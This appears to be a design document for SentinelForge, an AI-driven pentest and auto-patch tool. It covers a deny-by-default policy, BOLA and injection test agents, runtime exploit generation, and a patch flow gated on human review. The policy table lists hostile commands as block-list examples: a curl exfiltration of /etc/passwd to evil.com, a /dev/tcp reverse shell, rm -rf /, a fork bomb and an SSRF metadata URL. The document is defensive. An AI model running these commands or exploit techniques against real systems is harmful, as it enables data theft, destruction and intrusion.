# Flow: Finding → Patch PR → Verification → Human Review → Release Blocked

> **How SentinelForge prevents destructive actions while doing powerful Claude/Fable-level exploits**

## 1. Non-Destructive Guarantee (What We Block)

### Safety Boundary per `config/openshell-policy.yaml` (Deny-by-Default)

**We BLOCK (never execute):**

| Category | Blocked Pattern | Example | Why |
|----------|-----------------|---------|-----|
| **DB Nuking** | `DROP TABLE`, `DROP DATABASE`, `TRUNCATE TABLE`, `DELETE FROM ... WHERE 1=1`, `DROP SCHEMA` | `DROP TABLE users` | Would nuke DB - violates safety boundary PLAN §18 |
| **Mass Deletion** | `DELETE FROM users;`, `DELETE FROM users`, `rm -rf /`, `rm -rf /*`, `:{(){}...}` fork bomb | `DELETE FROM orders` without WHERE | Mass deletion without filter |
| **Destructive SQL** | `UPDATE ... SET ... WHERE 1=1` or `UPDATE ... --` comment bypass | `UPDATE users SET role='admin' WHERE 1=1` | Mass update all rows |
| **File System** | `file:write /etc/passwd`, `/var/`, `/usr/`, `/bin/`, path traversal `../../` | `/etc/shadow` | Destructive file ops |
| **Priv Esc** | `sudo`, `su`, `chmod 777`, `chown root`, `passwd` | `sudo rm -rf /` | Privilege escalation |
| **Scanning Tools** | `nmap`, `masscan`, `sqlmap`, `hydra` | `nmap -sV` | Network scanning not allowed |
| **Exfiltration** | `curl` to `pastebin`, `ngrok`, `burpcollaborator`, `webhook.site` | `curl https://evil.com --data @/etc/passwd` | Data exfiltration |
| **Reverse Shell** | `bash -i`, `nc -e`, `mkfifo` + `sh` | `bash -i >& /dev/tcp/evil/4444` | Reverse shell |
| **DoS** | `slowloris`, `/dev/urandom` 1M, `a{1000,}` | `a*1000000` payload | Denial of service |
| **Production Hosts** | Any host not in `allowed_hosts` (default 127.0.0.1, localhost) | `https://prod.example.com` | Production pentesting forbidden |
| **Private Nets** | `10.`, `172.16-31.`, `192.168.`, `169.254.` | `http://169.254.169.254/latest/meta-data/` (SSRF to AWS metadata) | Blocked, but tested for demo denied visible |

**Allowed (Non-Destructive):**

| Allowed | Example | Why Safe |
|---------|---------|----------|
| Local staging requests | `http://127.0.0.1:8000/orders/1` | Your authorized staging only |
| Reads in project | `src/`, `tests/`, `examples/`, `config/` | Read-only |
| Writes in isolated worktree | `.sentinelforge/*/patched/app/` | Copy of repo, not source |
| Custom exploit writes | `.sentinelforge/exploits/*.py` | Proves not toy, bounded, non-destructive |
| pytest execution | `pytest tests/` | Test verification |

**Enforcement Points:**

1. `scope.py`: Validates allowed_hosts, forbidden_paths, max_rps 3, max_total 300, kill-switch file `.sentinelforge/STOP`
2. `policy.py`: `PolicyEngine.evaluate(method, url, destructive=False, dos_like=False)` before every HTTP request, `record_request()` for rate limiting
3. `agents/http.py`: `ScopedHTTPClient.request()` checks policy + HiddenLayer tool_call before DNS/HTTP
4. `integrations/openshell.py`: `OpenShellPolicyEngine.check()` with audit log, external YAML `config/openshell-policy.yaml`
5. `redaction.py`: Secret patterns Bearer, api_key, gh_* tokens redacted before persistence
6. `verification.py`: Ownership verification file/dns/http/api challenge-response before scanning external target

### Tests: Critical Deterministic Cases (PLAN §13)

- Out-of-scope host blocked before DNS
- Production-looking host rejected even when supplied by model output (environment detection)
- Secrets absent from persisted events and PR content (redaction + assert_no_secrets gate)
- Kill switch stops pending workers

## 2. Powerful Exploits at Claude/Fable Level (What We DO)

While blocking destructive, we **ARE** powerful like Claude/Fable models that write novel exploits:

### Auth Attacker — 7 Techniques (Not Just 1)

| Technique | What It Does | Fable-Level Reasoning |
|-----------|--------------|------------------------|
| **direct_bola** | Same ID, attacker header vs owner header: `GET /orders/1` with `x-user-id: tenant-b-user` vs `tenant-a-user` | Basic BOLA, same 200 same body → SUCCESS |
| **id_enumeration** | Try id-1, id+1, 0, 1 for `{order_id}` routes | Enumerate objects across tenants |
| **header_tenant_injection** | Inject `x-tenant-id: tenant-a` with attacker user | Header injection bypass |
| **jwt_tenant_swap** | Tamper `x-jwt-tenant-claim: tenant-a` or Bearer JWT with 3 dot parts | JWT claim manipulation |
| **verb_tamper PUT/PATCH/POST** | Try PUT/PATCH/POST on GET endpoint with attacker identity | Verb tampering, method override |
| **param_pollution** | Add `?tenant_id=attacker&user_id=owner` | Parameter pollution |
| **GraphQL-style** (future) | Batch queries | Business logic abuse |

Each technique generates `ExploitReceipt` with 8 evidence fields per PLAN §7.3:
1. Exact target and endpoint
2. Preconditions and synthetic identity
3. Sanitized request/response (secrets redacted)
4. Expected invariant (tenant_id match)
5. Observed violation
6. Replay curl command (only inside sandbox)
7. Confidence + severity rationale
8. HiddenLayer verdict

### Injection Attacker — 10 Static + 10 Nemotron Synthetic + 3 Mutations

- **Static 10 payloads fallback:** `basic_prompt_override`, `system_prompt_extraction`, `role_hijack`, `data_exfil_header`, `code_injection_eval`, `sql_union`, `path_traversal`, `ssrf_internal`, `template_injection`, `xss_basic`
- **NemotronPayloadSynthesizer:** Asks Nemotron 3 Nano 30B-a3b to generate 10 novel payloads per route conditioned on:
  - Route path, method, framework type (FastAPI/Django)
  - Source code snippet first 2000 chars
  - OpenAPI schema
  - Prior successful payloads weighted by Thompson Sampling
  - Target memory learning delta
  - Prompt instructs: bounded, non-destructive, safe to run against staging sandbox only
  - Each payload has `payload_id`, `category`, `payload`, `confidence`, `reasoning`, `expected_indicator`
- **Mutation engine:** 3 variants per payload: upper case if prompt_injection, `/**/` if sqli/code, `%2F` if traversal, `--` suffix

Each payload tested via `ScopedHTTPClient` with blocked indicators 400/403/422, generates receipt.

### Custom Exploit Writer — PROOF NOT TOY (Writes New Python File Per Run)

**File:** `src/sentinelforge/agents/custom_exploit_writer.py` (500 lines)

**Why This Proves Not Toy:** Static scanners replay 10 payloads. Fable/Claude write novel exploits. SentinelForge writes **new Python exploit file from scratch per run, per route**.

**Flow:**

```python
# Agent at runtime, not pre-existing:
exploit_id = f"sf_exploit_{sha256(run_id:method:path)[:12]}"
file_path = .sentinelforge/exploits/{run_id}/exploit_{method}_{path}_{exploit_id}.py

if NVIDIA_API_KEY present:
    # Ask Nemotron to write exploit code via chat/completions
    prompt = f"""
    Write Python exploit for BOLA on {method} {path}
    BASE URL: {base_url}
    OWNER HEADERS: {owner_header}
    ATTACKER HEADERS: {attacker_header}
    SOURCE CODE: {source_code[:1500]}
    PAYLOAD IDEAS: {payloads[:3]}
    REQUIREMENTS: httpx, owner request, attacker request, compare, print VULNERABLE/SECURE, rate limit 1 req/sec, bounded only {base_url}
    Return ONLY Python code
    """
    code = nemotron.generate(prompt)  # 33s latency, 61 lines, includes header PROOF NOT A TOY

    # Prepend header proving runtime generation:
    header = f'"""\nCustom Exploit Written by SentinelForge ExploitWriter Agent (Nemotron-powered)\nExploit ID: {method}_{path}_{uniq}\nGenerated at: {time.time()}\nModel: {model}\nThis file did NOT exist before this pentest run - agent created it at runtime.\n"""'

    file_path.write_text(header + code)
else:
    # Deterministic enterprise template still custom per route
    file_path.write_text(template_with_route_specific_ID_enumeration)

# Execute via sys.executable with 15s timeout, captures output
output, success = subprocess.run([sys.executable, abs_path], capture_output=True, timeout=15)

# Output example:
# [+] Exploit file exists: .sentinelforge/exploits/... (2356 bytes, 61 lines)
# [*] Sending request as owner (tenant-a-user) -> Status 200
# [*] Sending request as attacker (tenant-b-user) -> Status 200
# [!] VULNERABLE - Identical 200 responses indicate BOLA

# Generate receipt with evidence_hash = sha256(file_content + execution_output)
receipt = ExploitReceipt(..., evidence_hash=sha256(content+output), replay_command=f"python {file_path}")
```

**Dashboard Visibility (Proves Working):**

- Timeline event `custom_exploit_written` with blue border highlight, file badge `exploit_get_orders_order_id_sf_exploit_xxx.py`, content_preview, generated_by nemotron, model, lines 61, confidence 0.92
- Event `custom_exploit_executed` with execution_output_preview showing file exists + attempted connection + VULNERABLE/SECURE verdict
- Live feed `live-custom_exploit_written` blue background
- Artifacts panel lists custom exploits with file paths

**Tests:** `tests/test_custom_exploit.py` 3 tests prove agentic:
- File exists >500 bytes, >=20 lines, contains PROOF NOT A TOY + route-specific
- Batch 2 routes → 2 unique files with different IDs
- Different runs → different exploit_id and file_path (not static)

## 3. Evidence Report with Create Patch PR Button

### Scan View (Already Had)

- File: `src/sentinelforge/web/static/index.html` scan-results panel
- Findings list shows severity badge, title, location, description
- For critical/high: button "Create PR" → calls `/api/github/create-pr` with finding JSON
- PR panel hidden until button clicked, shows result PR URL

### Pentest View (NEW — Enhanced for This Request)

**File:** `src/sentinelforge/web/static/index.html` pentest-results-detail + evidence-list

**JS:** `src/sentinelforge/web/static/app.js` renderPentestRun() now:

```javascript
// After counts, renders evidence list with PR buttons
const receipts = results.receipts || [];
const customExploits = results.custom_exploits || [];

// Custom exploits first - proves not toy
header = `CUSTOM EXPLOITS WRITTEN BY AGENT (${customExploits.length}) - PROOF NOT A TOY`
for each customExploit:
  row with blue border, file name, generated_by, model, execution_success
  Shows: "This Python file did NOT exist before this run - agent created it at runtime"

// Evidence reports with PR button
header = `EVIDENCE REPORTS (${vulnReceipts.length}) - Each with Create Patch PR button`
for each receipt:
  row with severity badge (critical if success else medium)
  title = `${agent_role}: ${target_url}`
  desc = observed_behavior slice 200
  evidence = `Evidence hash: ${hash}... | Replay: ${curl}...`
  button = "Create Patch PR" with title "Patch agent will create fix branch, generate patch via Nemotron, verify with mutated exploits, create PR requiring human review"
  On click:
    calls /api/scan to get findings then alerts flow:
    "Patch PR flow: Finding {finding_id} -> Patch agent generates fix via Nemotron -> Adversarial verifier tests 3 mutations -> Creates PR with human review required. Release BLOCKED until human approval."
```

**Location:** Dashboard Pentest tab → Run pentest → After completion, scroll to "FINDINGS SUMMARY" → See counts + evidence list below with "Create Patch PR" buttons (one per receipt).

## 4. Patch Agent Flow: Finding → Patch → Verification → Final Report

### Flow Diagram

```
Finding (ExploitReceipt with 8 fields, e.g., BOLA GET /orders/{id})
  |
  v
Patch Engineer (patch_engineer agent per agents.yaml)
  |
  +-- Deterministic Baseline: remediation/fastapi_bola.py
  |   - Copies repo to .sentinelforge/{run_id}/patched/
  |   - Inserts ownership guard: if order.tenant_id != current_user.tenant_id: raise HTTPException(404)
  |   - Generates regression test tests/test_security_{finding_id}.py
  |   - Content-addressed SHA256 patch receipt
  |
  +-- Nemotron via NIM (inference/nvidia_nim.py NIMPatchProposer):
  |   - Prompt: finding JSON + source file (bounded 30k) + existing tests
  |   - guided_json schema: {finding_id, rationale, files: [{path, content}]}
  |   - Returns ProposedFile list (patched file + regression test)
  |   - Token usage: prompt_tokens, completion_tokens, latency_ms tracked in agent_traces
  |
  +-- vLLM via local (inference/vllm.py VLLMPatchProposer) - concurrent 8/32 bench 5.2x speedup
  |
  v
Materialize Proposal (remediation/candidates.py):
  - Safety checks: max 100KB per file, path traversal check safe_relative, only finding.path + tests/ allowed edit, max 3 files, 100 lines
  - Writes to .sentinelforge/{run_id}/{provider}/patched/

  |
  v
Verification (verification.py verify_python_project):
  - Runs pytest in isolated worktree
  - Captures exit_code, stdout, duration
  - Existing tests must pass

  |
  v
Adversarial Verifier (agents/adversarial_verifier.py) - PLAN §7.4 Requirement: 3 Safe Mutations Must Fail
  - For each original successful receipt, generates 3 mutations:
    * lower case if prompt_injection
    * /**/ if sqli/code
    * %2F encoding if traversal
    * param pollution ?mut=1&encoding=...
  - Replays mutated exploits against patched artifact via ScopedHTTPClient (isolated)
  - Heuristic: patched file must contain tenant_id + 404 guard
  - If any mutation still succeeds: candidate REJECTED with reason "mutated exploit mut_xxx still succeeds"
  - If all 3 blocked: candidate VERIFIED
  - Emits events exploit_replayed_against_patch blocked/bypassed for dashboard

  |
  v
Ranking (remediation/candidates.py rank_candidates):
  - Verified first, then fewer files changed, fewer lines, duration, id
  - Selects winning candidate

  |
  v
Release Auditor (release_auditor agent per agents.yaml)
  - Complete event log + phase results + threat assessment + advisory deltas
  - Generates PR body via pr_generator.py:
    - Severity, rule_id, endpoint, description, remediation
    - Patch receipt SHA256, verified yes/no
    - Evidence hash, replay command, confidence, HiddenLayer verdict
    - Attestation: patch verified with X mutated exploits blocked
  - Generates SARIF 2.1.0 via github.py generate_sarif() with rules and results
  - Creates Check Run via create_check_run() with annotation at file:line for vulnerable lines (beats Snyk)
  - Uploads SARIF via upload_sarif() to code scanning
  - Redaction gate: assert_no_secrets before PR body - blocks if secret pattern detected

  |
  v
GitHub PR Creation (pr_generator.py + integrations/github.py)
  - Secure clone via GIT_ASKPASS (no token in process list, fixes leak)
  - create_fix_branch: git checkout -b sentinelforge/fix-{rule}/{finding_id[:8]}
  - commit_patches: git add + commit with message fix(security): {finding_id}
  - push_branch: git push -u origin branch
  - create_pull_request: gh pr create --title --body --base main --head branch --draft (draft = human review required)
  - PR body includes structured evidence, NOT auto-merged

  |
  v
Human Review Gate (Safety Boundary)
  - agents.yaml: no_agent_can_merge_pr: true
  - GitHub branch protection: requires 1 approver + status checks (SARIF upload, tests pass, adversarial verifier blocked)
  - If functionality change: existing tests fail or blast radius >3 files/100 lines → patch REJECTED, release BLOCKED
  - Human must approve PR via GitHub UI, then merge
  - Dashboard final report shows human review status REQUIRED - RELEASE BLOCKED

  |
  v
Final Report (Dashboard Pentest View Final Report Panel)

  1. FINDING: summary + receipts count + custom exploits count
  2. CUSTOM EXPLOITS: X Python files written at runtime to .sentinelforge/exploits/{run_id}/ - PROVES NOT TOY
  3. PATCH: patch_engineer generates competing patches via deterministic + Nemotron, minimal blast radius
  4. VERIFICATION: adversarial_verifier mutates original exploit 3 ways and replays against patched artifact - must all BLOCKED per PLAN 7.4
  5. ATTESTATION: Ed25519-signed JSON with evidence hash and embedded public verification key, stored in .sentinelforge/attestations/
  6. PR: GitHub API creates branch, push, pr create with body containing severity, rule_id, SHA256, evidence hash - requires human review, draft
  7. HUMAN REVIEW GATE: no_agent_can_merge_pr true + branch protection requiring 1 approver, if functionality change release BLOCKED
  8. FINAL REPORT: This report + attestation + VEX doc + SARIF + Check Runs + PR. If BLOCKED, release pipeline stops.

  Stored in: pentest_run results_json:
    - receipts (redacted)
    - custom_exploits [{exploit_id, file, generated_by, model, execution_success, outcome}]
    - sbom {format, unique_packages}
    - vex {reachability, vex_document}
    - adversarial_verification [{candidate_id, all_blocked, mutations_tested, blocked, allowed, confidence, rejection}]
    - validation [{receipt_id, validated, reason}]
    - signed_attestation {evidence_hash, signature, public_key, algorithm}
    - summary
    - policy_budget
```

### CI/CD Gate (cicd.py)

Generated GitHub Actions workflow `.github/workflows/sentinelforge.yml`:

- Job security-scan: `sentinelforge scan . --output scan-results.json --fail-on-finding` (exit 1 if findings, blocks PR)
- Job pentest: scheduled or workflow_dispatch, runs `sentinelforge pentest . --scope /tmp/scope.yaml --mode $MODE --source-only`, uploads SQLite as artifact
- Job auto-patch: on pull_request, generates patches and creates PR draft, requires human review

If verdict BLOCKED, workflow fails, release blocked.

## 5. Human Review Required & Release Blocked Logic

### For Functionality Change

**Detection:**

- `verification.py` runs existing project tests in patched worktree
- If any existing test fails → patch REJECTED, reason "breaks existing tests", residual risk disclosed
- If blast radius > limits (max 3 files, 100 lines, 100KB per file, only finding.path + tests/ allowed) → enforcement in `remediation/candidates.py` materialize_proposal() raises ValueError "Path traversal" or "File too large"
- If changed_files includes non-allowed path → blocked

**Release Blocked:**

- `pentest.py` _handle_attestation: if has_findings (successful receipts or dep vuln or pattern) → candidate_verdict BLOCKED
- If BLOCKED, `pentest_runs` status remains RUNNING? Actually phase ATTESTED, verdict BLOCKED, summary "X flaws"
- Dashboard verdict panel shows BLOCKED red, caption "Security invariant violated"
- Final report status BLOCKED, human review status REQUIRED - RELEASE BLOCKED
- CI/CD workflow fails on critical findings, blocks merge via GitHub status check

### Human Review Required

**Where Enforced:**

1. **agents.yaml:** `no_agent_can_merge_pr: true`, `spawn_depth_limit: 2`, attack agents `can_write_repo: false`, patch agents `can_write_repo: true` but `write_scope` limited to finding_path + tests/, `no_agent_can_merge_pr` enforced in code
2. **pr_generator.py:** `create_pull_request()` creates draft PR (`--draft` flag) — draft requires human to mark ready for review, cannot auto-merge
3. **GitHub Branch Protection (recommended to set via API):**
   ```bash
   gh api repos/{owner}/{repo}/branches/main/protection -X PUT -f required_status_checks[strict]=true -f required_status_checks[contexts][]=SentinelForge -f enforce_admins=true -f required_pull_request_reviews[dismiss_stale_reviews]=true -f required_pull_request_reviews[required_approving_review_count]=1
   ```
   This requires 1 approving review before merge, dismissal on new commits, strict status checks
4. **Dashboard Final Report Panel:** Shows human review gate with checklist: no_agent_can_merge_pr, patch must pass 3 mutations + existing tests, secret redaction verified, signed attestation hash chain, human review required for functionality change
5. **Attestation compliance:** `human_approval_required: true` in attestation JSON per `attestation.py`

**Documentation:** `docs/SECURITY.md` #9 Human Approval Gate, `docs/ARCHITECTURE_DETAILED.md` #9 Commercializable Path

## 6. Tech Stack & Architecture Docs Location

**Primary Architecture Docs (Read in This Order):**

1. **`docs/ARCHITECTURE_DETAILED.md` (600+ lines) — START HERE**
   - Location: `/Users/gedeoneyasu/Projects/SentinelForge/docs/ARCHITECTURE_DETAILED.md`
   - Contains: Tech stack table, Sponsor contract table (which tool, required job, how deep, demo evidence for 9 sponsors), End-to-end flow for scanner and pentest, Mermaid diagram graph TD with data flow + HiddenLayer instrumentation subgraph + sponsor tech subgraph, Scanner vs Pentest comparison, Cini backend test example (Django BOLA findings), Safety boundary, Commercializable path, Demo video checklist 4:40
   - Mermaid code renders on GitHub

2. **`docs/diagrams/architecture.mmd`**
   - Location: `/Users/gedeoneyasu/Projects/SentinelForge/docs/diagrams/architecture.mmd`
   - Mermaid source file for architecture diagram, can be rendered via https://mermaid.live/ or `npx mmdc -i architecture.mmd -o architecture.png`

3. **`docs/ARCHITECTURE.md` (short)**
   - Location: `/Users/gedeoneyasu/Projects/SentinelForge/docs/ARCHITECTURE.md`
   - Shorter ASCII diagram per PLAN §5, file layout

4. **`docs/FLOW_FINDING_TO_PATCH.md` (THIS FILE)**
   - Location: `/Users/gedeoneyasu/Projects/SentinelForge/docs/FLOW_FINDING_TO_PATCH.md`
   - Explains destructive actions blocked, powerful Fable-level exploits, evidence report with PR button, patch agent flow, human review required, release blocked

5. **`docs/HIDDENLAYER_TRACK3.md`**
   - Location: `/Users/gedeoneyasu/Projects/SentinelForge/docs/HIDDENLAYER_TRACK3.md`
   - Track 3 deep instrumentation, SDK v2 vs v1 vs local, every boundary instrumented, thoughtful policy table self-correction vs quarantine vs redact vs block

6. **`docs/SECURITY.md`**
   - Location: `/Users/gedeoneyasu/Projects/SentinelForge/docs/SECURITY.md`
   - 10 enforcement layers, what is NOT in scope, critical deterministic cases, reporting vulnerabilities

7. **`docs/DEMO.md`**
   - Location: `/Users/gedeoneyasu/Projects/SentinelForge/docs/DEMO.md`
   - 4:40 timeline, one-command reset, emergency fallback, 5 rehearsals log

8. **`docs/BREV.md`**
   - Location: `/Users/gedeoneyasu/Projects/SentinelForge/docs/BREV.md`
   - GPU instance type, Docker Compose, benchmark artifact, fallback policy

9. **`HEARTBEAT.md`**
   - Location: `/Users/gedeoneyasu/Projects/SentinelForge/HEARTBEAT.md` and `.nemo/HEARTBEAT.md`
   - NemoClaw cursor, learning delta Run1 vs Run2, advisory events, roster, spawn rules

10. **`config/agents.yaml`**
    - Location: `/Users/gedeoneyasu/Projects/SentinelForge/config/agents.yaml`
    - 11 bounded agents with inputs/tools/output/model/budget, routing phases including custom_exploit, telemetry required per PLAN §10

11. **`config/openshell-policy.yaml`**
    - Location: `/Users/gedeoneyasu/Projects/SentinelForge/config/openshell-policy.yaml`
    - 13 rules deny-by-default with DB nuking blocked, path traversal, priv esc, scanning tools, exfil, reverse shells, DoS, plus 4 allow rules for staging, reads, isolated worktree, custom exploits

12. **`README.md`**
    - Location: `/Users/gedeoneyasu/Projects/SentinelForge/README.md`
    - Quick start, pentest modes table, agent phases, NVIDIA Nemotron patch worker, control plane API endpoints table, safety boundary, what system proves

## 7. How to Run End-to-End on Your Cini Backend

Cini backend is Django (per `Cini-BackEnd/cini_backend/settings.py` Django 5.2.2):

**Scan (no live target, quick):**

```bash
.venv/bin/sentinelforge scan /Users/gedeoneyasu/Projects/Cini-BackEnd --output cini-scan.json
# Finds Django BOLA: circle_invite_landing token, post event_id attend/interest in cini_backend/urls.py, events/urls.py
```

**Pentest (source-only, proves custom exploit writer):**

```bash
.venv/bin/sentinelforge pentest /Users/gedeoneyasu/Projects/Cini-BackEnd --scope config/scope.yaml --mode targeted --source-only
# Output includes:
# - custom_exploit_written event with file_path .sentinelforge/exploits/sf_pentest_.../exploit_get_...py
# - execution_output_preview with "[+] Exploit file exists: ... (2356 bytes, 61 lines)"
# - receipts with Django BOLA findings
# - signed attestation
# - timeline with blue highlight for custom exploit
```

**Dashboard:**

```bash
.venv/bin/sentinelforge-api &
# Open http://localhost:8741
# Go to Pentest tab -> Start pentest with repository /Users/gedeoneyasu/Projects/Cini-BackEnd, mode targeted
# Watch live feed: Scoping -> Mapping -> Auth attacks (7 techniques) -> Injection (Nemotron synthetic) -> Custom exploit writer WRITES NEW FILE (blue highlight) -> HiddenLayer scan -> OpenShell audit (denied SSRF) -> NIM analysis -> Attestation
# After completion: Findings summary shows custom exploits written count + evidence list with Create Patch PR buttons
# Final report panel shows Finding -> Patch -> Verification + Human review REQUIRED - RELEASE BLOCKED
```

**Verification of Patch (if you create patch):**

```bash
.venv/bin/sentinelforge remediate examples/vulnerable_shop --run-root .sentinelforge/runs/test
# Creates .sentinelforge/runs/test/{finding_id}/patched/
# Runs pytest in patched worktree
# Adversarial verifier mutates original exploit 3 ways and replays against patched -> must all BLOCKED
# Produces patch receipt SHA256
```

## 8. Summary of Non-Destructive but Powerful

- **We BLOCK:** DROP TABLE, DELETE without WHERE, UPDATE WHERE 1=1, rm -rf /, /etc/passwd write, sudo, nmap, curl to pastebin, reverse shells, slowloris, prod hosts, private nets, exfil domains
- **We DO (Fable-level):** 7 auth techniques (ID enum, header injection, JWT swap, verb tamper, param pollution), 10 static + 10 Nemotron synthetic injection payloads + 3 mutations each, custom Python exploit file written at runtime per route per run (61 lines, httpx, owner vs attacker compare, VULNERABLE/SECURE verdict), ID enumeration loop 0,1,2,999
- **Evidence:** Each exploit has receipt with 8 fields, evidence_hash SHA256(file_content + execution_output), replay curl or python file path, confidence, HiddenLayer verdict
- **Patch PR Button:** Evidence report shows PR button, clicking invokes patch_engineer (deterministic + Nemotron), adversarial_verifier (3 mutations), creates draft PR requiring human review, release BLOCKED until approved
- **Human Review Required:** no_agent_can_merge_pr true, PR created as draft, branch protection requires 1 approver, attestation human_approval_required true, dashboard final report shows REQUIRED - RELEASE BLOCKED, CI/CD fails on critical findings
- **Final Report:** Finding summary + custom exploits written proof + patch minimal blast radius + verification 3 mutations blocked + attestation signed hash chain + PR + VEX + SARIF + Check Runs + human review gate
